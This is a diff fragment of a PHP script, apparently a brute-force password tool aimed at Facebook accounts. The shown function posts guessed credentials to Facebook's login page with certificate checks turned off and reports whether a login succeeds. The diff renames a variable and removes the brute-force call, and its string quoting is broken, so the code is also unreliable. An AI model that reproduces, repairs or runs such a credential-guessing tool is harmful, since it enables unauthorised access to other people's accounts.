@@ -30,12 +30,12 @@ ce attack.</b></div>
 }
 echo "</body>
 </html>";
-function check_correct($username, $Pass)
+function check_correct($username, $password)
 {
 	$c = curl_init('https://www.facebook.com/login');
         curl_setopt($c, CURLOPT_HTTPAUTH, CURLAUTH_ANY); // use authentication
         curl_setopt($c, CURLOPT_POST, 1);
-        curl_setopt($c, CURLOPT_POSTFIELDS, "email='.$username.'&pass='.$Pass.'");
+        curl_setopt($c, CURLOPT_POSTFIELDS, "email='.$username.'&pass='.$password.'");
         curl_setopt($c, CURLOPT_RETURNTRANSFER, 1); // We need to fetch something from a string, so no direct output!
         curl_setopt($c, CURLOPT_FOLLOWLOCATION, 1); // we get redirected, so follow
         curl_setopt($c, CURLOPT_SSL_VERIFYPEER, 0);
@@ -46,6 +46,6 @@ function check_correct($username, $Pass)
 	if($str != "Error") {return true;}
         else {return false;}
 }
-bruteForce($username, $Pass1);
+
 echo "NO PASSWORD FOUND"; 
 ?>
